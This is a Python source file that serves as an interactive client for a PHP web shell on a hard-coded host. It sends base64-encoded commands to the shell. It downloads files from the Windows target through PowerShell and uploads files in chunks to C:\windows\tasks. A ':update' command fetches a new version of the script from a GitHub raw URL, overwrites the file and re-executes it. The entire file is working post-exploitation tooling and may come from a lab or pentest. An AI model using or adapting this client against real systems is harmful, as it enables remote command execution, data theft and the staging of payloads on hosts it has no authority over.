import base64
import os
import sys
from pathlib import Path
from typing import Optional, Tuple

import requests

try:
    import readline  # type: ignore[import]
except Exception:
    readline = None  # type: ignore[assignment]

SCHEME = "http"
HOST = "10.143.4.133"
PATH = "/includes/shell.php"
TIMEOUT = None
SEPARATOR = "=" * 60
SUB_SEPARATOR = "-" * 60
# Default chunk size for uploads; can be overridden with the
# CMD_CLIENT_UPLOAD_CHUNK_SIZE environment variable.
UPLOAD_CHUNK_SIZE = int(os.getenv("CMD_CLIENT_UPLOAD_CHUNK_SIZE", "5000"))
# Default directory on the remote Windows host when no remote path
# is provided explicitly for uploads.
DEFAULT_REMOTE_UPLOAD_DIR = r"C:\windows\tasks"
UPDATE_URL = (
    "https://raw.githubusercontent.com/Hunt3r0x/shared/refs/heads/main/cmd_client.py"
)


def build_url() -> str:
    return f"{SCHEME}://{HOST}{PATH}"


def encode_cmd(cmd: str) -> str:
    data = cmd.encode("utf-8", errors="ignore")
    return base64.b64encode(data).decode("ascii")


def send_command(cmd: str) -> Tuple[str, Optional[int]]:
    encoded = encode_cmd(cmd)
    url = build_url()
    try:
        if TIMEOUT is None:
            res = requests.post(url, data={"c": encoded})
        else:
            res = requests.post(url, data={"c": encoded}, timeout=TIMEOUT)
    except requests.exceptions.Timeout:
        return "request timed out", None
    except requests.exceptions.ConnectionError:
        return "connection failed", None
    except requests.RequestException as exc:
        return f"request error: {exc}", None
    body = res.text.strip()
    if not res.ok:
        prefix = f"http {res.status_code}"
        if body:
            return f"{prefix}: {body}", res.status_code
        return prefix, res.status_code
    return body, res.status_code


def extract_pre(text: str) -> str:
    """
    Extract content inside the <pre>...</pre> that shell.php wraps around output.
    Falls back to returning the whole body if tags are not found.
    """
    lower = text.lower()
    start = lower.find("<pre>")
    end = lower.rfind("</pre>")
    if start == -1 or end == -1 or end <= start:
        return text
    return text[start + len("<pre>") : end].strip()


def ps_escape_single_quotes(value: str) -> str:
    """
    Escape single quotes for use inside a single-quoted PowerShell string literal.
    In PowerShell, single quotes are escaped by doubling them: ' -> ''.
    """
    return value.replace("'", "''")


def download_file(remote_path: str, local_path: str) -> None:
    """
    Download a remote file from a **Windows** target by having PowerShell
    base64-encode it, then decoding and writing it locally.
    """
    # Build a PowerShell command that prints base64 of the file to stdout
    remote_ps = ps_escape_single_quotes(remote_path)
    cmd = (
        "powershell -NoLogo -NonInteractive -Command "
        f"\"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{remote_ps}'))\""
    )
    body, status = send_command(cmd)
    if status is not None and status != 200:
        raise RuntimeError(f"download failed, status={status}: {body}")

    inner = extract_pre(body)
    inner = inner.strip()
    if not inner:
        raise RuntimeError("download failed: empty response/body")

    try:
        data = base64.b64decode(inner, validate=False)
    except Exception as exc:
        raise RuntimeError(f"download failed: invalid base64 data ({exc})") from exc

    path = Path(local_path)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    print(f"[download] saved remote '{remote_path}' to '{local_path}' ({len(data)} bytes)")


def upload_file(local_path: str, remote_path: str) -> None:
    """
    Upload a local file to a **Windows** target by base64-encoding it locally
    and having PowerShell decode it into a file on the remote side.
    """
    path = Path(local_path)
    if not path.is_file():
        raise FileNotFoundError(f"local file not found: {local_path}")

    data = path.read_bytes()
    total = len(data)

    if total == 0:
        raise ValueError("cannot upload empty file")

    remote_ps = ps_escape_single_quotes(remote_path)

    # Send the file in small chunks so we do not hit command-line length
    # limits or HTTP/server size limits.
    first = True
    offset = 0
    last_body: str = ""
    last_status: Optional[int] = None
    chunk_index = 0

    while offset < total:
        chunk = data[offset : offset + UPLOAD_CHUNK_SIZE]
        offset += len(chunk)
        b64 = base64.b64encode(chunk).decode("ascii")
        chunk_index += 1

        if first:
            # First chunk: create/overwrite the file
            ps_cmd = (
                f"[IO.File]::WriteAllBytes('{remote_ps}', "
                f"[Convert]::FromBase64String('{b64}'))"
            )
            first = False
        else:
            # Subsequent chunks: append to the existing file
            ps_cmd = (
                "$p='{remote}';"
                "$d=[Convert]::FromBase64String('{b64}');"
                "$fs=[IO.File]::Open($p,[IO.FileMode]::Append);"
                "$fs.Write($d,0,$d.Length);"
                "$fs.Close()"
            ).format(remote=remote_ps, b64=b64)

        cmd = "powershell -NoLogo -NonInteractive -Command " f"\"{ps_cmd}\""
        last_body, last_status = send_command(cmd)
        if last_status is not None and last_status != 200:
            raise RuntimeError(
                f"upload chunk failed with status={last_status}: {last_body}"
            )
        # Give some feedback for large uploads
        print(f"[upload] sent chunk {chunk_index}, {len(chunk)} bytes")

    # Optionally, verify remote size
    verify_cmd = (
        "powershell -NoLogo -NonInteractive -Command "
        f"\"if (Test-Path '{remote_ps}') "
        "{(Get-Item '{remote_ps}').Length} else {{'[no such file]'}}\""
    )
    verify_body, verify_status = send_command(verify_cmd)

    print_response(f"[upload {local_path} -> {remote_path}]", last_body, last_status)
    print(
        f"[upload] finished '{local_path}' ({total} bytes) to remote '{remote_path}'"
    )
    print_response("[upload verify remote size]", verify_body, verify_status)


def print_response(cmd: str, body: str, status: Optional[int]) -> None:
    print(SEPARATOR)
    print(f"cmd: {cmd}")
    if status is not None:
        print(f"status: {status}")
    print(SUB_SEPARATOR)
    text = body.strip()
    if not text:
        print("[no output]")
    else:
        lines = [line.rstrip() for line in text.splitlines()]
        blank = False
        for line in lines:
            if line:
                if blank:
                    blank = False
                print(line)
            else:
                if not blank:
                    print()
                    blank = True
    print(SEPARATOR)


def read_cmd() -> Optional[str]:
    """
    Read a single command from the user.

    Behaviour:
    - EOF (Ctrl+D / Ctrl+Z+Enter on Windows) => return None (caller exits)
    - Empty line => return "" (caller just reprompts)
    - "exit"/"quit" => return None (caller exits)
    - Ctrl+C while typing => return "" (cancel current input, new prompt)
    """
    try:
        value = input("cmd> ")
    except EOFError:
        # Graceful end-of-input: tell caller to exit.
        return None
    except KeyboardInterrupt:
        # Cancel the current line, show a fresh prompt.
        print()
        return ""

    value = value.strip()
    if not value:
        return ""
    if value.lower() in ("exit", "quit"):
        return None
    if readline is not None:
        try:
            readline.add_history(value)
        except Exception:
            pass
    return value


def perform_update() -> None:
    """
    Fetch the latest cmd_client.py from GitHub, overwrite the local file,
    and restart this script so the new version is used immediately.
    """
    print(f"[update] fetching latest client from:\n         {UPDATE_URL}")
    try:
        res = requests.get(UPDATE_URL, timeout=15)
    except requests.RequestException as exc:
        print(f"[update error] request failed: {exc}")
        return

    if not res.ok:
        print(f"[update error] http {res.status_code}: {res.text.strip()}")
        return

    new_source = res.text
    target = Path(__file__).resolve()

    try:
        target.write_text(new_source, encoding="utf-8")
    except OSError as exc:
        print(f"[update error] failed to write file: {exc}")
        return

    print(f"[update] updated {target.name} ({len(new_source.encode('utf-8'))} bytes)")
    print("[update] restarting client with new version...")
    # Replace the current process with a fresh Python running THIS file
    # explicitly, so any previously imported module state is discarded.
    sys.stdout.flush()
    os.execv(sys.executable, [sys.executable, str(target)] + sys.argv[1:])


def main() -> None:
    print("Type commands to send to the remote shell.")
    print("Use 'exit' or 'quit', press Ctrl+D (EOF), or Ctrl+C to exit.")
    print("Special local commands:")
    print("  :download <remote_path> <local_path>")
    print("  :upload   <local_path> [remote_path]")
    print(f"           (default remote dir: {DEFAULT_REMOTE_UPLOAD_DIR})")
    print("  :update   # pull latest client from GitHub and restart")
    while True:
        cmd = read_cmd()
        if cmd is None:
            print("Exiting client.")
            break
        if cmd == "":
            # Blank/aborted input: just reprompt
            continue

        # Local meta-commands
        if cmd.startswith(":download "):
            parts = cmd.split(maxsplit=2)
            if len(parts) != 3:
                print("usage: :download <remote_path> <local_path>")
                continue
            _, remote_path, local_path = parts
            try:
                download_file(remote_path, local_path)
            except Exception as exc:
                print(f"[download error] {exc}")
            continue

        if cmd.startswith(":upload"):
            # Accept both:
            #   :upload <local>
            #   :upload <local> <remote>
            rest = cmd[len(":upload") :].strip()
            if not rest:
                print("usage: :upload <local_path> [remote_path]")
                continue

            parts = rest.split(maxsplit=1)
            local_path = parts[0]
            if len(parts) == 1:
                # Only local path supplied. Upload to default remote directory
                # with the same base name as the local file.
                remote_path = str(
                    Path(DEFAULT_REMOTE_UPLOAD_DIR) / Path(local_path).name
                )
            else:
                remote_path = parts[1]
            try:
                upload_file(local_path, remote_path)
            except Exception as exc:
                print(f"[upload error] {exc}")
            continue

        if cmd.strip() == ":update":
            try:
                perform_update()
            except Exception as exc:
                print(f"[update error] {exc}")
            # If perform_update succeeds, os.execv will replace this process
            # and we will never reach this point.
            continue

        try:
            body, status = send_command(cmd)
        except KeyboardInterrupt:
            # Allow Ctrl+C during a running request to abort the command
            # but keep the client running.
            print("\n[interrupted, command cancelled]")
            continue
        print_response(cmd, body, status)


if __name__ == "__main__":
    main()

